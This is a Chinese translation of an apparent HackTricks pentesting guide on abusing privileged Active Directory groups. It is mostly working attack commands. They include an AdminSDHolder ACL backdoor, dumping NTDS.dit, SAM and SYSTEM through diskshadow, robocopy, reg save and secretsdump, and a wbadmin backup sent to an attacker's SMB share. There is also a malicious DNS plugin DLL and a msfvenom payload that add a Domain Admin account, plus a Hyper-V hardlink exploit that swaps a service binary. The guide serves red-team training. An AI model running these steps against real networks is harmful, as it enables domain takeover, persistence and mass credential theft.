# 特权组

<details>

<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 已知具有管理权限的组

* **管理员**
* **域管理员**
* **企业管理员**

在进行安全评估时，其他账户成员资格和访问令牌权限也可能在链式攻击多个攻击向量时有用。

## 账户操作员 <a href="#account-operators" id="account-operators"></a>

* 允许在域上创建非管理员账户和组
* 允许本地登录到DC

获取该组的**成员**：
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
请注意spotless用户的成员资格：

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

然而，我们仍然可以添加新用户：

![](../../.gitbook/assets/a2.png)

以及本地登录到DC01：

![](../../.gitbook/assets/a3.png)

## AdminSDHolder组

**AdminSDHolder** 对象的访问控制列表（ACL）被用作模板，以**复制** **权限** 到 Active Directory 中的**所有“受保护组”**及其成员。受保护的组包括具有特权的组，如域管理员、管理员、企业管理员和架构管理员。\
默认情况下，该组的ACL被复制到所有的"受保护组"内。这样做是为了避免对这些关键组的故意或意外更改。然而，如果攻击者修改了组**AdminSDHolder**的ACL，例如给予普通用户完全权限，这个用户将在一个小时内拥有受保护组内所有组的完全权限。\
如果有人试图从域管理员（例如）中删除这个用户，在一小时或更短时间内，该用户将重新回到该组。

获取组的**成员**：
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
将用户添加到 **AdminSDHolder** 组：
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
检查用户是否属于 **Domain Admins** 组：
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
如果您不想等待一个小时，您可以使用PS脚本立即执行还原操作：[https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**在ired.team上获取更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **AD 回收站**

该组允许您读取已删除的AD对象。在那里可以找到一些有价值的信息：
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### 域控制器访问

注意我们当前的成员身份无法访问DC上的文件：

![](../../.gitbook/assets/a4.png)

然而，如果用户属于`Server Operators`：

![](../../.gitbook/assets/a5.png)

情况就变了：

![](../../.gitbook/assets/a6.png)

### 权限提升 <a href="#backup-operators" id="backup-operators"></a>

使用[`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)或Sysinternals的`sc`来检查服务的权限。
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
```markdown
这证实了Server Operators组具有[SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)访问权限，这给了我们对此服务的完全控制。
您可以滥用此服务来[**使服务执行任意命令**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path)并提升权限。

## 备份操作员 <a href="#backup-operators" id="backup-operators"></a>

与`Server Operators`成员资格一样，如果我们属于`Backup Operators`，我们可以**访问`DC01`文件系统**。

这是因为该组授予其**成员**[**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4)和[**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)权限。**SeBackupPrivilege**允许我们**遍历任何文件夹并列出**文件夹内容。这将让我们**从文件夹中复制文件**，即使没有其他权限也可以。然而，要滥用这些权限复制文件，必须使用标志[**FILE_FLAG_BACKUP_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)。因此，需要特殊工具。

为此，您可以使用[**这些脚本**](https://github.com/giuliano108/SeBackupPrivilege)**。**

获取该组的**成员**：
```
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **本地攻击**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### AD 攻击

例如，您可以直接访问域控制器文件系统：

![](../../.gitbook/assets/a7.png)

您可以滥用此访问权限来**窃取**活动目录数据库**`NTDS.dit`**，以获取域中所有用户和计算机对象的所有**NTLM 哈希值**。

#### 使用 diskshadow.exe 转储 NTDS.dit

使用 [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)，您可以**创建** **`C` 驱动器**的影子副本，并且例如在 `F` 驱动器中。然后，您可以从这个影子副本中窃取 `NTDS.dit` 文件，因为它不会被系统使用：
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
在本地攻击中，您现在可以复制具有特权的文件 **`NTDS.dit`**：
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
另一种复制文件的方法是使用 [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**：**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
然后，你可以轻松地**窃取** **SYSTEM** 和 **SAM**：
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
最后，你可以**获取所有哈希**来自于**`NTDS.dit`**：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### 使用 wbadmin.exe 导出 NTDS.dit

使用 wbadmin.exe 与使用 diskshadow.exe 非常相似，wbadmin.exe 是内置于 Windows 中的命令行工具，自 Windows Vista/Server 2008 起就有了。

在使用之前，你需要在攻击者机器上[**设置 ntfs 文件系统以用于 smb 服务器**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801)。

当你完成 smb 服务器的设置后，你需要在目标机器上缓存 smb 凭据：
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
如果没有错误，使用 wbadmin.exe 来利用它：
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
如果成功，它将转储到 `C:\ntds.dit`。

[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

用户如果是 **DNSAdmins** 组的成员或对 DNS 服务器对象有**写权限**，可以在 **DNS 服务器**上以 **SYSTEM** 权限加载**任意 DLL**。\
这非常有趣，因为 **域控制器**经常被用作 **DNS 服务器**。

如这篇 [**文章**](https://adsecurity.org/?p=4064) 所示，当 DNS 在域控制器上运行时（这是非常常见的），可以执行以下攻击：

* DNS 管理通过 RPC 进行
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) 允许我们**加载**自定义 **DLL**，而不验证 DLL 的路径。这可以通过命令行中的 `dnscmd` 工具完成
* 当 **`DnsAdmins`** 组的成员运行下面的 **`dnscmd`** 命令时，`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` 注册表键将被填充
* 当 **DNS 服务重启**时，该路径中的 **DLL** 将被**加载**（即，域控制器的机器账户可以访问的网络共享）
* 攻击者可以加载**自定义 DLL 以获得反向 shell**，甚至可以加载 Mimikatz 之类的工具作为 DLL 来转储凭据。

获取组的**成员**：
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 执行任意 DLL

如果您有一个用户在 **DNSAdmins 组** 内，您可以让 **DNS 服务器以 SYSTEM 权限加载任意 DLL**（DNS 服务以 `NT AUTHORITY\SYSTEM` 运行）。您可以让 DNS 服务器加载一个**本地或远程**（通过 SMB 共享）的 DLL 文件，执行：
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
```markdown
可以在[https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL)找到一个有效的DLL示例。我会将函数`DnsPluginInitialize`的代码更改为类似以下内容：
```
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
或者您可以使用msfvenom生成一个dll：
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
因此，当**DNSservice**启动或重启时，将创建一个新用户。

即使将用户添加到DNSAdmin组，您**默认情况下无法停止和重启DNS服务。** 但您总是可以尝试执行：
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**了解更多关于此权限提升的信息，请访问ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

如这篇[**文章**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)中详细介绍的，也可以使用 `Mimikatz` 工具的创建者提供的 [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) 通过**修改** [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) 文件来执行**反向 shell**单行命令或我们选择的其他命令，以获得命令执行能力。

### WPAD 记录用于中间人攻击

另一种**滥用 DnsAdmins** 组权限的方法是创建一个 **WPAD 记录**。该组的成员有权[禁用全局查询阻止安全功能](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)，默认情况下会阻止此攻击。Server 2008 首次引入了在 DNS 服务器上添加到全局查询阻止列表的能力。默认情况下，Web 代理自动发现协议（WPAD）和站点间自动隧道寻址协议（ISATAP）位于全局查询阻止列表上。这些协议非常容易被劫持，任何域用户都可以创建包含这些名称的计算机对象或 DNS 记录。

在**禁用全局查询**阻止列表并创建一个 **WPAD 记录**后，运行 WPAD 的**每台机器**在默认设置下都会通过我们的攻击机器代理其**流量**。我们可以使用如 [**Responder**](https://github.com/lgandx/Responder) **或** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) 这样的工具**执行流量欺骗**，尝试捕获密码哈希并离线破解，或执行 SMBRelay 攻击。

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## 事件日志读取器

[**事件日志读取器**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) 组的成员有权**访问生成的事件日志**（例如新进程创建日志）。在日志中可能会发现**敏感信息**。让我们看看如何查看日志：
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Exchange Windows 权限

成员被授予**写入域对象的 DACL** 的能力。攻击者可以滥用此权限，**给用户** [**DCSync**](dcsync.md) 权限。\
如果在 AD 环境中安装了 Microsoft Exchange，通常会发现用户账户甚至计算机作为此组的成员。

这个 [**GitHub 仓库**](https://github.com/gdedrouas/Exchange-AD-Privesc) 解释了一些滥用该组权限来**提升权限**的**技术**。
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V 管理员

[**Hyper-V 管理员**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) 组对所有 [Hyper-V 功能](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines) 拥有完全访问权限。如果 **域控制器** 已被 **虚拟化**，那么 **虚拟化管理员** 应被视为 **域管理员**。他们可以轻松地 **创建域控制器的克隆** 并 **挂载** 虚拟 **磁盘** 离线以获取 **`NTDS.dit`** 文件，并提取域中所有用户的 NTLM 密码散列。

在这篇 [博客](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) 中也有详细记录，当 **删除** 虚拟机时，`vmms.exe` 会尝试 **恢复对应的** **`.vhdx` 文件** 的原始文件权限，并以 `NT AUTHORITY\SYSTEM` 身份执行，不会模拟用户。我们可以 **删除 `.vhdx`** 文件并 **创建** 一个指向 **受保护的 SYSTEM 文件** 的本机 **硬链接**，你将被赋予该文件的全部权限。

如果操作系统易受 [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) 或 [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) 的影响，我们可以利用这一点获得 SYSTEM 权限。否则，我们可以尝试 **利用服务器上安装了以 SYSTEM 身份运行的服务的应用程序**，该服务可由非特权用户启动。

### **利用示例**

一个例子是 **Firefox**，它安装了 **`Mozilla 维护服务`**。我们可以更新 [这个利用](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)（一个针对 NT 硬链接的概念验证），以授予我们当前用户对以下文件的完全权限：
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **获取文件的所有权**

运行PowerShell脚本后，我们应该**完全控制这个文件并且可以取得它的所有权**。
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **启动 Mozilla 维护服务**

接下来，我们可以用一个**恶意的 `maintenanceservice.exe`** 替换这个文件，**启动**维护**服务**，并以 SYSTEM 身份执行命令。
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
此攻击向量已被 2020 年 3 月的 Windows 安全更新所缓解，该更新改变了与硬链接相关的行为。
{% endhint %}

## 组织管理

此组也存在于安装了 **Microsoft Exchange** 的环境中。\
该组成员可以**访问** **所有** 域用户的**邮箱**。\
该组还对名为 `Microsoft Exchange Security Groups` 的 OU 拥有**完全控制**权限，该 OU 包含 [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) 组\*\*\*\*（点击链接查看如何滥用此组进行权限提升）。

## 打印操作员

该组成员被授予：

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **在域控制器上本地登录** 并关闭它
* 权限去**管理**、创建、共享和删除**连接到域控制器的打印机**

{% hint style="warning" %}
如果命令 `whoami /priv` 在非提升权限的上下文中没有显示 **`SeLoadDriverPrivilege`**，你需要绕过 UAC。
{% endhint %}

获取该组的**成员**：
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
查看本页如何滥用SeLoadDriverPrivilege进行权限提升：

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## 远程桌面用户

该组成员可以通过RDP访问PC。\
获取该组的**成员**：
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
更多关于 **RDP** 的信息：

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## 远程管理用户

该组的成员可以通过 **WinRM** 访问PC。
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
关于 **WinRM** 的更多信息：

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## 服务器操作员 <a href="#server-operators" id="server-operators"></a>

该成员资格允许用户配置域控制器，并拥有以下权限：

* 允许在本地登录
* 备份文件和目录
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) 和 [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* 更改系统时间
* 更改时区
* 从远程系统强制关机
* 恢复文件和目录
* 关闭系统
* 控制本地服务

获取该组的**成员**：
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 参考资料 <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
